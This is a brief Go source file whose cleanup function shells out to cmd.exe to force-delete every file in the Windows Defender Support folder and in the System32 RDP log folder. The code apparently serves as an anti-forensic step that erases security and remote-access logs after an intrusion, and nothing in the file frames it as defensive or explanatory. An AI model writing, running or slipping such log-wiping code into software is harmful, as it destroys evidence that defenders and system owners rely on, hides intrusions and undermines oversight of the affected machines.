package main
import "os/exec"
func cleanup() {
 exec.Command("cmd", "/C", "del /f /q D:\\ProgramData\\Microsoft\\Windows Defender\\Support\\*.*").Run()
 exec.Command("cmd", "/C", "del /f /q %SystemRoot%\\System32\\LogFiles\\RDP\\*.*").Run()
}
